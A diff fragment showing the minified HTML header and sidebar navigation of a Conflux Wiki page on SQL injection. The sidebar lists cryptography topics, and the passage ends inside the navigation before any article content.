@@ -1,64 +1,1199 @@
-<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Conflux Wiki"><meta name=author content="Conflux Wiki Team"><link href=https://conflux-wiki.github.io/web/sqli/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.1, mkdocs-material-7.1.10"><title>SQL 注入 - Conflux Wiki</title><link rel=stylesheet href=../../assets/stylesheets/main.1fe995fd.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.f1a3b89f.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans";--md-code-font-family:"Source Code Pro"}</style><link rel=stylesheet href=../../static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#sql class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title="Conflux Wiki" class="md-header__button md-logo" aria-label="Conflux Wiki" data-md-component=logo> <img src=../../static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> Conflux Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> SQL 注入 </span> </div> </div> </div> <div class=md-header__option> <div class=md-select> <button class="md-header__button md-icon" aria-label="Select language"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.52 17.52 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7 1.62-4.33L19.12 17h-3.24z"/></svg> </button> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ hreflang class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ hreflang class=md-select__link> en - English </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/conflux-wiki/conflux-wiki/ title="前往 GitHub 仓库" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> conflux-wiki/conflux-wiki </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../development/introduction/ class=md-tabs__link> Development </a> </li> <li class=md-tabs__item> <a href=../../ecosystem/introduction/ class=md-tabs__link> Ecosystem </a> </li> <li class=md-tabs__item> <a href=../introduction/ class="md-tabs__link md-tabs__link--active"> Web </a> </li> <li class=md-tabs__item> <a href=../../blockchain/introduction/ class=md-tabs__link> BlockChain </a> </li> <li class=md-tabs__item> <a href=../../nft/introduction/ class=md-tabs__link> NFT </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title="Conflux Wiki" class="md-nav__button md-logo" aria-label="Conflux Wiki" data-md-component=logo> <img src=../../static/img/logo.png alt=logo> </a> Conflux Wiki </label> <div class=md-nav__source> <a href=https://github.com/conflux-wiki/conflux-wiki/ title="前往 GitHub 仓库" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> conflux-wiki/conflux-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> 简介 </a> </li> <li class=md-nav__item> <a href=../../usage/ class=md-nav__link> 如何使用 Conflux Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1_3 type=checkbox id=__nav_1_3> <label class=md-nav__link for=__nav_1_3> 贡献指南 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=贡献指南 data-md-level=2> <label class=md-nav__title for=__nav_1_3> <span class="md-nav__icon md-icon"></span> 贡献指南 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../contribute/before-contributing/ class=md-nav__link> 贡献之前 </a> </li> <li class=md-nav__item> <a href=../../contribute/basic-contribute-approach/ class=md-nav__link> 基本贡献方式 </a> </li> <li class=md-nav__item> <a href=../../contribute/documentation-requirement/ class=md-nav__link> 贡献文档要求 </a> </li> <li class=md-nav__item> <a href=../../contribute/translation/ class=md-nav__link> 翻译 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../discussion/ class=md-nav__link> 讨论交流 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../introduction/history/ class=md-nav__link> 区块链 历史 </a> </li> <li class=md-nav__item> <a href=../../introduction/link/ class=md-nav__link> Conflux相关链接 </a> </li> <li class=md-nav__item> <a href=../../introduction/highlight-time/ class=md-nav__link> 重要时刻 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/introduction/ class=md-nav__link> 密码学简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 基础数学知识 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基础数学知识 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 基础数学知识 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/basic/introduction/ class=md-nav__link> 基础数学知识 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_3 type=checkbox id=__nav_3_3> <label class=md-nav__link for=__nav_3_3> 古典密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密码 data-md-level=2> <label class=md-nav__title for=__nav_3_3> <span class="md-nav__icon md-icon"></span> 古典密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/classical/introduction/ class=md-nav__link> 古典密码简介 </a> </li> <li class=md-nav__item> <a href=../../crypto/classical/monoalphabetic/ class=md-nav__link> 单表代换加密 </a> </li> <li class=md-nav__item> <a href=../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代换加密 </a> </li> <li class=md-nav__item> <a href=../../crypto/classical/others/ class=md-nav__link> 其它类型加密 </a> </li> <li class=md-nav__item> <a href=../../crypto/classical/summary/ class=md-nav__link> 总结 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4 type=checkbox id=__nav_3_4> <label class=md-nav__link for=__nav_3_4> 流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密码 data-md-level=2> <label class=md-nav__title for=__nav_3_4> <span class="md-nav__icon md-icon"></span> 流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/streamcipher/intro/ class=md-nav__link> 流密码 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_2 type=checkbox id=__nav_3_4_2> <label class=md-nav__link for=__nav_3_4_2> 伪随机数生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=伪随机数生成器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_2> <span class="md-nav__icon md-icon"></span> 伪随机数生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/streamcipher/prng/intro/ class=md-nav__link> 伪随机数生成器介绍 </a> </li> <li class=md-nav__item> <a href=../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密码安全伪随机数生成器 </a> </li> <li class=md-nav__item> <a href=../../crypto/streamcipher/prng/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_3 type=checkbox id=__nav_3_4_3> <label class=md-nav__link for=__nav_3_4_3> 线性同余生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=线性同余生成器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_3> <span class="md-nav__icon md-icon"></span> 线性同余生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 线性同余生成器 </a> </li> <li class=md-nav__item> <a href=../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_4 type=checkbox id=__nav_3_4_4> <label class=md-nav__link for=__nav_3_4_4> 反馈移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反馈移位寄存器 data-md-level=3> <label class=md-nav__title for=__nav_3_4_4> <span class="md-nav__icon md-icon"></span> 反馈移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反馈移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 线性反馈移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非线性反馈移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_4_5 type=checkbox id=__nav_3_4_5> <label class=md-nav__link for=__nav_3_4_5> 特殊流密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密码 data-md-level=3> <label class=md-nav__title for=__nav_3_4_5> <span class="md-nav__icon md-icon"></span> 特殊流密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5 type=checkbox id=__nav_3_5> <label class=md-nav__link for=__nav_3_5> 块加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=块加密 data-md-level=2> <label class=md-nav__title for=__nav_3_5> <span class="md-nav__icon md-icon"></span> 块加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/introduction/ class=md-nav__link> 块加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_2 type=checkbox id=__nav_3_5_2> <label class=md-nav__link for=__nav_3_5_2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=__nav_3_5_2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_3 type=checkbox id=__nav_3_5_3> <label class=md-nav__link for=__nav_3_5_3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=__nav_3_5_3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_4 type=checkbox id=__nav_3_5_4> <label class=md-nav__link for=__nav_3_5_4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=__nav_3_5_4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_5 type=checkbox id=__nav_3_5_5> <label class=md-nav__link for=__nav_3_5_5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=__nav_3_5_5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_6 type=checkbox id=__nav_3_5_6> <label class=md-nav__link for=__nav_3_5_6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=__nav_3_5_6> <span class="md-nav__icon md-icon"></span> Simon and Speck </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/simon-speck/ class=md-nav__link> Simon and Speck Block Ciphers </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_5_7 type=checkbox id=__nav_3_5_7> <label class=md-nav__link for=__nav_3_5_7> 分组模式 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=分组模式 data-md-level=3> <label class=md-nav__title for=__nav_3_5_7> <span class="md-nav__icon md-icon"></span> 分组模式 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/introduction/ class=md-nav__link> 分组模式 </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/padding/ class=md-nav__link> 填充方式 </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/ecb/ class=md-nav__link> ECB </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/cbc/ class=md-nav__link> CBC </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/pcbc/ class=md-nav__link> PCBC </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/cfb/ class=md-nav__link> CFB </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/ofb/ class=md-nav__link> OFB </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/ctr/ class=md-nav__link> CTR </a> </li> <li class=md-nav__item> <a href=../../crypto/blockcipher/mode/padding-oracle-attack/ class=md-nav__link> Padding Oracle Attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6 type=checkbox id=__nav_3_6> <label class=md-nav__link for=__nav_3_6> 非对称加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=非对称加密 data-md-level=2> <label class=md-nav__title for=__nav_3_6> <span class="md-nav__icon md-icon"></span> 非对称加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/asymmetric/introduction/ class=md-nav__link> 介绍 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_2 type=checkbox id=__nav_3_6_2> <label class=md-nav__link for=__nav_3_6_2> RSA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=RSA data-md-level=3> <label class=md-nav__title for=__nav_3_6_2> <span class="md-nav__icon md-icon"></span> RSA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_theory/ class=md-nav__link> RSA 介绍 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_module_attack/ class=md-nav__link> 模数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_e_attack/ class=md-nav__link> 公钥指数相关攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_d_attack/ class=md-nav__link> 私钥 d 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_coppersmith_attack/ class=md-nav__link> Coppersmith 相关攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher/ class=md-nav__link> RSA 选择明密文攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_side_channel/ class=md-nav__link> RSA 侧信道攻击 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_pkcs_attack/ class=md-nav__link> Bleichenbacher's attack </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/rsa/rsa_complex/ class=md-nav__link> RSA 复杂题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_3 type=checkbox id=__nav_3_6_3> <label class=md-nav__link for=__nav_3_6_3> 背包加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=背包加密 data-md-level=3> <label class=md-nav__title for=__nav_3_6_3> <span class="md-nav__icon md-icon"></span> 背包加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/asymmetric/knapsack/knapsack/ class=md-nav__link> 背包加密 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_4 type=checkbox id=__nav_3_6_4> <label class=md-nav__link for=__nav_3_6_4> 离散对数相关 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=离散对数相关 data-md-level=3> <label class=md-nav__title for=__nav_3_6_4> <span class="md-nav__icon md-icon"></span> 离散对数相关 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/asymmetric/discrete-log/discrete-log/ class=md-nav__link> 离散对数 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/discrete-log/elgamal/ class=md-nav__link> ElGamal </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/discrete-log/ecc/ class=md-nav__link> ECC </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_6_5 type=checkbox id=__nav_3_6_5> <label class=md-nav__link for=__nav_3_6_5> 格密码 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=格密码 data-md-level=3> <label class=md-nav__title for=__nav_3_6_5> <span class="md-nav__icon md-icon"></span> 格密码 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/asymmetric/lattice/overview/ class=md-nav__link> 格概述 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/lattice/introduction/ class=md-nav__link> 基本介绍 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/lattice/lattice-reduction/ class=md-nav__link> 格基规约算法 </a> </li> <li class=md-nav__item> <a href=../../crypto/asymmetric/lattice/cvp/ class=md-nav__link> CVP </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7 type=checkbox id=__nav_3_7> <label class=md-nav__link for=__nav_3_7> 哈希函数 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=哈希函数 data-md-level=2> <label class=md-nav__title for=__nav_3_7> <span class="md-nav__icon md-icon"></span> 哈希函数 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/hash/introduction/ class=md-nav__link> 哈希函数 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_2 type=checkbox id=__nav_3_7_2> <label class=md-nav__link for=__nav_3_7_2> MD5 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=MD5 data-md-level=3> <label class=md-nav__title for=__nav_3_7_2> <span class="md-nav__icon md-icon"></span> MD5 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/hash/md5/ class=md-nav__link> MD5 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_3 type=checkbox id=__nav_3_7_3> <label class=md-nav__link for=__nav_3_7_3> SHA1 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SHA1 data-md-level=3> <label class=md-nav__title for=__nav_3_7_3> <span class="md-nav__icon md-icon"></span> SHA1 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/hash/sha1/ class=md-nav__link> SHA1 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_4 type=checkbox id=__nav_3_7_4> <label class=md-nav__link for=__nav_3_7_4> FNV <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=FNV data-md-level=3> <label class=md-nav__title for=__nav_3_7_4> <span class="md-nav__icon md-icon"></span> FNV </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/hash/fnv/ class=md-nav__link> Fowler–Noll–Vo hash function </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_7_5 type=checkbox id=__nav_3_7_5> <label class=md-nav__link for=__nav_3_7_5> Hash Attack <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Hash Attack" data-md-level=3> <label class=md-nav__title for=__nav_3_7_5> <span class="md-nav__icon md-icon"></span> Hash Attack </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../crypto/hash/attack/ class=md-nav__link> Hash Attack </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../crypto/hash/complex/ class=md-nav__link> 综合题目 </a> </li> </ul> </nav> </li> <li 